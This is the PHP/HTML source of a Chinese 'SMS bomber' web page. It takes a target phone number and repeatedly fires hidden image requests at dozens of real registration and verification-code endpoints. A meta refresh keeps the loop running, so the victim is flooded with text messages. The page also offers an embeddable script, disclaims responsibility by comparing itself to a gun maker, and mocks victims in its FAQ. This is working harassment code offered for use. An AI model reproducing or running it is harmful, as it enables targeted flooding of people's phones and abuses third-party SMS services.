
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<link rel="stylesheet" href="css.css" type="text/css"/>
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
<title>短信炸弹</title>
</head>
<body>

<div class="container">
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">本站允许使用开发接口，永久免费！<span class="label label-success" style="float: right;" onclick="window.open('http://blog.0907.org', '_new')"><strong>由无名强力驱动</strong></span></h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">+86</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		<button type="button" class="btn btn-success" onclick="http://blog.0907.org/%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9">停止轰炸线程</button>
        <button type="button" class="btn btn-warning" target="_blank" onclick="top.location='http://blog.0907.org/sms/wd'">启动无敌模式</button>
		</div>
		</form>


<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a;
$d=$_GET['hm'];
?>
<div class="tip"><?php
if($d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>短信轰炸已启动,  对<strong>$d</strong>,已经发起<strong>$e</strong>波短信轰炸,请静静的等待几秒钟查看效果</div></div>";
    echo "<div style='display:none'><img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://t.12580.com/special/sendValidcodeByWap.do?mobile=$d&valicode=' alt=''/>
<img src='http://w.sohu.com/t2/tologin.do?mnd=$d&qr=1' alt=''/>
<img src='http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&templateDir=template&theme=simple&name=querySMSValiCode&id=querySMSValiCode&downId=&operateType=1&isPass=true&user.asidountName=$d&Submit=?E4?B8?8B?E4?B8?80?E6?AD?A5' alt=''/>
<img src='http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=$d&p=72' alt=''/>
<img src='https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=$d&SMS_CD=URM001&typ=Y&r=0.9636801626045905' alt=''/>
<img src='https://feixin.10086.cn/asidount/RegisterLv3Ajax?stype=m&stext=$d' alt=''/>
<img src='http://my.feixin.10086.cn/password/findpasswordvalidate?type=0&asidount=$d' alt=''/>
<img src='http://go.10086.cn/index.do?method=doReg&mobile=$d&source=reg' alt=''/>
<img src='http://www.keepc.com/registerForMobileForCode.act?mobileNo=$d' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='https://passport.jd.com/emReg/isMobileEngaged?mobile=$d&r=0.08241349037594953' alt=''/>
<img src='http://shoujibao.net/pams2/m/s.do?j=l&c=31879&p=73&mobile=$d&password=1415926' alt=''/>
<img src='http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=$d' alt=''/>
<img src='http://wap.buidq.com/wap/webcallService.aspx?tel=$d' alt=''/>
<img src='http://www.uwewe.com/get/IsUser.aspx?phone=$d&quhao=86' alt=''/>
<img src='http://www.gewara.com/ajax/mobile/register.xhtml?mobile=$d&captchaId=&captcha=' alt=''/>
<img src='http://www.gewara.com/checkMember.xhtml?tag=mobile&itemvalue=$d' alt=''/>
<img src='http://www.dianping.com/ajax/json/asidount/reg/mobile/send?m=$d' alt=''/>
<img src='http://www.ushi.com/openRegU!checkNumber.jhtml?basicProfile.mobile=$d' alt=''/>
<img src='http://www.efala.net/newfindpwbysms.flow?byname=$d' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://zj.189.cn/zjpr/member/authentication/sendValidatePhone.html?phone=$d' alt=''/>
<img src='http://weibo.com/signup/v5/formcheck?type=mobile&value=$d&__rnd=1363496469546' alt=''/>
<img src='http://api.open.uc.cn/cas/register/mobi/resendVCode?uc_param_str=einisivelafrpf&client_id=20033&from=cas&mobi=$d' alt=''/>
<img src='http://reg.email.163.com/unireg/call.do?cmd=added.mobileverify.sendAcode?mobile=$d&uid=$d?40163.com&mark=mobile_start' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=$d&appId=www_home&v=1&v=1' alt=''/>
<img src='http://i.youku.com/u/bindMobile?__rt=1&__ro=&mobile=$d' alt=''/>
<img src='https://safe.renren.com/actions/changesafemobile/sendmobilecaptcha?ajax-type=json&token=1ZhR7iv65SgaNXliuA7mujgTO3s3k1CL&mobile=$d&requestToken=496404876&_rtk=e95787e6' alt=''/>
<img src='http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=$d' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=$d' alt=''/>
<img src='https://login.vancl.com/login/BeginRegister.ashx?action=sendmobilecode&key=$d&validatecode=&_=1363498730859' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=check&param=$d' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=$d' alt=''/>
<img src='http://passport.cntv.cn/mobileRegister.do?msisdn=$d&verfiCodeType=1&method=getRequestVerifiCode' alt=''/>
<img src='http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage&xajax=processSendOrUpdateMessage&xajaxargs?5B?5D=?3Cxjxquery?3E?3Cq?3Emobile?3D$d?3C?2Fq?3E?3C?2Fxjxquery?3E&xajaxargs?5B?5D=mobile&xajaxr=1363500615734' alt=''/>
<img src='https://passport.jd.com/emReg/sendMobileCode?mobile=$d&r=0.9010949897739119' alt=''/>
<img src='https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&logonId=$d&URL=SNUserRegisterComfirmView&_=1363500974671' alt=''/>
<img src='http://asidount.iqiyi.com/security/secret/mobile/adm.action?time=1363501090218&mobile=$d' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://www.skywldh.com/registerForMobileForCode.act?mobileNo=$d&smSecurityCode=' alt=''/>
<img src='http://wap.skywldh.com/index.php?register&flag=flag&phone=$d&mss=on' alt=''/>
<img src='http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=$d&verify=01f735f97f1af959&checkcodeflag=1' alt=''/>
<img src='http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&phonemail=$d&type=1&randvalue=' alt=''/>
<img src='http://www.feiin.com/findAsidountInfoByAsidount.act?mobile=$d' alt=''/>
<img src='http://wap.feiin.cn/index.php?register?phone=$d' alt=''/>
<img src='http://www.feiin.cn/bindMobileCode.act?asidount=$d&quhao=0086' alt=''/>
<img src='http://www.66call.com/forgetpwd.aspx?ScriptManager1=UpdatePanel1|ImageButton2&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=?2FwEPDwULLTExMjY2ODE5MTgPFgYeCFRpbWVTcGFuBqpmMwD38M?2BIHgRjb2RlBQQ0MjY1HgRhY2N0BQsxNTgzODgwMjA0MmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFDEltYWdlQnV0dG9uMgUMSW1hZ2VCdXR0b24xBQxJbWFnZUJ1dHRvbjPdI0AXCiz2XIYks0CPZpmkSSEMDg?3D?3D&txtasidt=$d&txtcode=7426&txtpwd=&txtrepwd=&ImageButton2.x=76&ImageButton2.y=18' alt=''/><img src='http://www.wcall.net/ajax/send_captcha.jsp?mobile=86$d' alt=''/>
<img src='http://www.wcall.net/ajax/send_captcha.jsp?mobile=86$d' alt=''/>
<img src='http://www.uwewe.com/wap/reg.aspx?__VIEWSTATE=?2FwEPDwUKLTg3MDQ4MjcyNGRkTWAEkK5GOtWg8l1At7LuQLJsrtk?3D&__EVENTVALIDATION=?2FwEWBwLf79jTDQL7h7XWDwKd?2B7q4BwLinreAAgLChPzDDQK7q7GGCAKM54rGBiIS9Dt7i1j1h?2BDtH9EcyHIWJVZf&txtasidt=$d&txtpwd=&txtRepwd=&txtCode=&Button2=?E8?AF?AD?E9?9F?B3?E8?8E?B7?E5?8F?96?E9?AA?8C?E8?AF?81?E7?A0?81' alt=''/>
<img src='http://www.139talk.com/user/regnum.html?phone=$d&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://www.139talk.com/invite/invitesms.html?phone=$d&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/invite/regnum.html?phone=$d&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/download/smsdownload.html?popPhone=$d&phoneType=Iphone&popKey=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.159talk.com/user/regnum.html?phone=$d&type=1&key=h5u9albk8oveqm17rfo6kvo226' alt=''/><img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/k961601363512388' alt=''/>
<img src='http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=$d' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d&isCheckCode=1' alt=''/>
<img src='http://my.feixin.10086.cn/password/sendfindpasswordsms?MobileNo=$d' alt=''/>
<img src='http://f.10086.cn/im5/register/checkMobile.action?mobileNo=$d' alt=''/>
<img src='https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=$d&flagNum=3' alt=''/></div>";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'>";
}
?>
<div class="bs-callout bs-callout-success">
    <h4>开发接口</h4>
    <p>
        您可以使用下面的代码将 <a href="http://blog.0907.org/sms/mini">迷你轰炸台</a> 嵌入到网站中
        <pre>&lt;script src="http://blog.0907.org/sms/api/"&gt;&lt;/script&gt;</pre>
    </p>
</div>

<div class="bs-callout bs-callout-danger">
    <h4>法律声明</h4>
    <p>当您提交手机号码后, 程序会自动生成一段HTML代码并且由您的浏览器执行, 代码的生成与我们有关, 执行的过程以及后果与您有关. <br />换个角度来讲, 我们只是在制造枪并给你用, 至于你怎么用这把枪是你的事情. 本站不承担因您使用本网站所提供的功能造成间接或直接的损失. </p>
</div>
<div class="bs-callout bs-callout-warning">
    <h4>隐私条款</h4>
    <p>无论您是否发送 <i>Do Not Track</i>, 本站不会统计, 记录或追踪您的位置信息. 不会存储Cookies, 也不会记录您所提交的手机号码. <br />输入的手机号码会传递给第三方短信发送网关, 提交给第三方的过程是在您本机计算机中执行的. <br /></p>
</div>
<a name="faq"></a>
<div class="bs-callout bs-callout-success">
    <h4>常见问题</h4>
    <p>
        <strong>1. 轰炸后实际收到的短信很少</strong><br />短信发送接口, 运营商等因素可能会导致信息延迟或没有发送成功. <br /><br />
        <strong>2. 如何停止轰炸</strong><br />当您关闭或刷新页面即可停止轰炸.<br /><br />
        <strong>3. 我是被轰炸受害者</strong><br />解决不了, 建议关机或一头撞死.
    </p>
</div>
</div>
</body>
</html>